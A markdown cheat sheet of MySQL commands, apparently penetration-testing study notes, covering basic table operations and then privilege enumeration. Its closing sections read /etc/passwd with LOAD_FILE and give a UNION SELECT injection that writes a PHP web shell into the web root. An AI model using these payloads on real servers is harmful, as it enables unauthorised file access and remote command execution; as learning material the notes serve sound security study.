### Connect To MySQL Database

```sh
mysql -u user -h host -P port -p
```

#### Create Database

```sql
CREATE DATABASE database_name;
```

#### Create Table

```sql
CREATE TABLE logins (
	id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
);
```

#### Insert Record

```sql
INSERT INTO table_name (column2, column3) VALUES (column2_value, column3_value), (column2_value, column3_value);
```

This method automatically fills in columns with default values, like the `datetime` field, for example.

#### Drop Record/Table

```sql
DROP TABLE table_name;

ALTER TABLE table_name DROP column_name;
```

#### Alter Record

```sql
ALTER TABLE table_name ADD new_column TYPE; -- TYPE is to be replaced by INT, TEXT or any other type. This creates a new column.

ALTER TABLE table_name RENAME COLUMN new_column TO new_name; -- Renames a column.
```

#### Update Record

```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2 WHERE condition;
```

#### Sort Results

```sql
SELECT * FROM table_name ORDER BY column DESC, column2 ASC;
```

#### Limiting Results

```sql
SELECT * FROM table_name LIMIT 2;
```

#### Condition

```sql
SELECT * FROM table_name WHERE condition; -- A condition can be `id > 1`, for example.
```

#### Like Clause

```sql
SELECT * FROM table_name WHERE column_name LIKE 'admin%' AND column_name LIKE 'adm_n'; -- Similar to `grep admin*` and `grep adm?n`. AND can also be replaced with OR.
```

#### Make a Column the `PRIMARY KEY`

```sql
PRIMARY KEY (column_name)
```

#### Schemata

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
```

#### Get User

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

#### Get Privileges

```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE user="USERNAME"

SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" -- Check if `secure_file_priv` has a particular directory.
```

#### Read File

```sql
SELECT LOAD_FILE('/etc/passwd'); -- if the user has the `FILE` privilege
```

#### Write File

```sql
UNION SELECT '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'; -- This will only work if `secure_file_priv` has no directory. If it does, then you can only write to that directory.
```